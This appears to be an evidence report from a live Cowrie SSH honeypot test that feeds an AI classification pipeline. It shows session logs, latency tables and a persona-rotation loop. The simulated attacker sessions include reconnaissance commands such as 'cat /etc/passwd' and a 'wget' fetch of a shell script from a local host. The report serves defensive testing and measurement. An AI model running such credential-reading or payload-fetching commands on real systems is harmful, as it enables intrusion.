# Honeypot live evidence (real Cowrie)

Generated from the artifacts of the live run described in `docs/HONEYPOT_STUDY_GUIDE.md` 3.6 ("Status after the live Cowrie run"). Nothing below is synthetic: the Cowrie events are Cowrie's own `cowrie.json` lines, the session documents come from MongoDB after real SSH sessions (paramiko client) went through parser, backend and AI engine. Passwords in Cowrie lines are masked here; in MongoDB they are stored as `***REDACTED***`.

| Item | Value |
|---|---|
| Cowrie | git `c7773f4` (2026-10-15), Twisted 26.4.0, Python 3.14, WSL Ubuntu 26.04 user venv |
| SentinelAI | branch `db-fixes`, backend + AI engine on Windows, MongoDB database `sentinel-honeypot-verify` |
| Parser | `honeypot/parsers/log_parser.py --live` reading `cowrie.json` over `\\wsl.localhost` |
| Cowrie events in the logs | 97 |
| Sessions from the live Cowrie (src 127.0.0.1) | 12 |

## Sessions as stored

| Session | Class | Score | Duration (s) | Commands | Credentials | HASSH | Persona credited |
|---|---|---|---|---|---|---|---|
| `33b8edd6e13d` | RCE Attempt | 0.99 | 0 | 8 | 1 (redacted) | yes | centos_7 |
| `4bd045b2dc6b` | SSH Brute Force | 0.9 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `b2d275fe808d` | SSH Brute Force | 0.9 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `bc0500fc8c99` | SSH Brute Force | 0.9 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `24db82632b4c` | SSH Brute Force | 0.9 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `da88a01abe5b` | SSH Brute Force | 0.9 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `a5d9c4b2e967` | Port Scan | 0.75 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `8f11dae9e8de` | Port Scan | 0.75 | 0 | 0 | 1 (redacted) | yes | centos_7 |
| `ca364abd2bae` | BENIGN | 0.4 | 7 | 3 | 1 (redacted) | yes | centos_7 |
| `5657174141e8` | BENIGN | 0.4 | 3 | 3 | 1 (redacted) | yes | centos_7 |
| `500a36333112` | BENIGN | 0.4 | 3 | 2 | 1 (redacted) | yes | centos_7 |
| `c36554b01d7d` | BENIGN | 0.4 | 6 | 6 | 1 (redacted) | yes | ubuntu_22 |

Sessions with duration 0 were closed before the `duration_ms` parser fix; the later ones carry real durations. The blocked connection (deny-list test) produced no session, as intended.

## Ingest latency (Cowrie event → stored in MongoDB)

22 commands matched between Cowrie's log and MongoDB. Excluding the session deliberately written while the parser was stopped (`ca364abd2bae`, the restart test), latency was **144–490 ms** (median 320 ms), consistent with the parser's 0.5 s poll plus HTTP and database time.

| Session | Command | Latency (ms) |
|---|---|---|
| `33b8edd6e13d` | `hostname` | 471 |
| `33b8edd6e13d` | `uname -a` | 339 |
| `33b8edd6e13d` | `cat /etc/os-release` | 160 |
| `33b8edd6e13d` | `ls /home` | 490 |
| `33b8edd6e13d` | `cat /etc/passwd` | 320 |
| `33b8edd6e13d` | `whoami` | 150 |
| `33b8edd6e13d` | `wget http://127.0.0.1:8081/test.sh` | 471 |
| `33b8edd6e13d` | `exit` | 306 |
| `ca364abd2bae` | `id` | 56080 |
| `ca364abd2bae` | `uptime` | 55343 |
| `ca364abd2bae` | `exit` | 50559 |
| `5657174141e8` | `whoami` | 160 |
| `5657174141e8` | `cat /etc/issue` | 403 |
| `5657174141e8` | `exit` | 144 |
| `500a36333112` | `uname -r` | 390 |
| `500a36333112` | `exit` | 154 |
| `c36554b01d7d` | `hostname` | 175 |
| `c36554b01d7d` | `uname -r` | 236 |
| `c36554b01d7d` | `cat /etc/os-release` | 280 |
| `c36554b01d7d` | `ls /home` | 327 |
| `c36554b01d7d` | `grep 1000 /etc/passwd` | 372 |
| `c36554b01d7d` | `exit` | 417 |

## One session end to end: `33b8edd6e13d`

Cowrie's own JSON lines:

```json
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "eventid": "cowrie.session.connect", "timestamp": "2026-10-21T18:30:26.375606Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "version": "SSH-2.0-paramiko_5.1.0", "eventid": "cowrie.client.version", "timestamp": "2026-10-21T18:30:26.386000Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "hassh": "4c94058d5e9e31659879f79fd5b46084", "eventid": "cowrie.client.kex", "timestamp": "2026-10-21T18:30:26.395899Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "username": "root", "password": "<masked>", "eventid": "cowrie.login.success", "timestamp": "2026-10-21T18:30:26.446713Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "width": 80, "height": 24, "eventid": "cowrie.client.size", "timestamp": "2026-10-21T18:30:26.460490Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "arch": "linux-x64-lsb", "eventid": "cowrie.session.params", "timestamp": "2026-10-21T18:30:26.467963Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "hostname", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:27.477820Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "uname -a", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:28.677436Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "cat /etc/os-release", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:29.877961Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "ls /home", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:31.078545Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "cat /etc/passwd", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:32.278839Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "whoami", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:33.479134Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "wget http://127.0.0.1:8081/test.sh", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:34.680433Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "input": "exit", "eventid": "cowrie.command.input", "timestamp": "2026-10-21T18:30:35.880287Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "ttylog": "var/lib/cowrie/tty/9d5cff4801972ad65ff7d083dc42514be736784f1c4fb8d8289033e1f65cb4db", "size": 1982, "shasum": "9d5cff4801972ad65ff7d083dc42514be736784f1c4fb8d8289033e1f65cb4db", "duplicate": false, "duration_ms": 9425, "eventid": "cowrie.log.closed", "timestamp": "2026-10-21T18:30:35.888266Z"}
{"session": "33b8edd6e13d", "protocol": "ssh", "src_ip": "127.0.0.1", "src_port": 33760, "dst_ip": "127.0.0.1", "dst_port": 2222, "duration_ms": 10019, "eventid": "cowrie.session.closed", "timestamp": "2026-10-21T18:30:36.401342Z"}
```

The MongoDB document SentinelAI stored (selected fields):

```json
{
 "sessionId": "33b8edd6e13d",
 "sourceIP": "127.0.0.1",
 "status": "closed",
 "closureAnalysisState": "complete",
 "aiClassification": "RCE Attempt",
 "aiThreatScore": 0.99,
 "aiClassificationMethod": "honeypot_rules",
 "servedProfile": "centos_7",
 "qDeceptionScore": 47,
 "recommendedProfile": "ubuntu_22",
 "hassh": "4c94058d5e9e31659879f79fd5b46084",
 "durationSeconds": 0,
 "deceptionScore": 42,
 "engagementLevel": "medium",
 "commands": [
  "hostname",
  "uname -a",
  "cat /etc/os-release",
  "ls /home",
  "cat /etc/passwd",
  "whoami",
  "wget http://127.0.0.1:8081/test.sh",
  "exit"
 ],
 "credentials": [
  {
   "username": "root",
   "password": "***REDACTED***",
   "success": true
  }
 ],
 "mitreTechniques": [
  "T1003",
  "T1105",
  "T1595"
 ]
}
```

## Q-learner before and after

| | Episodes | Source |
|---|---|---|
| Shipped seed (`ai-engine/models/q_table.json`, unchanged) | 12087 | synthetic warm start |
| Runtime table after the live run (scratch copy) | 12099 | 12 updates from these real Cowrie sessions |

Recommendation from `centos_7` after the run: `ubuntu_22` (greedy).

## Closed deception loop

The rotator, authenticated only with `HONEYPOT_API_KEY`, applied the recommendation: it rewrote Cowrie's config, Cowrie restarted under a supervisor, and an SSH client then saw the Ubuntu banner, hostname, kernel, `os-release`, `/home/ubuntu` and `ubuntu` account (guide 3.6).

- Persona recorded in SystemSetting: `ubuntu_22`
- Audit entry: action `SETTINGS_CHANGED`, actor `honeypot-rotator` (service), `centos_7` → `ubuntu_22` via honeypot ingest key
- Next session credited to: `c36554b01d7d` → `ubuntu_22`

## Not covered by this run

- Real downloads: Cowrie refuses `wget` to non-routable addresses; outbound internet was not opened.
- The blocker read its deny-list from a local stub (WSL NAT cannot reach the Windows backend).
- Docker stack and iptables scripts (no Docker or root on this machine).
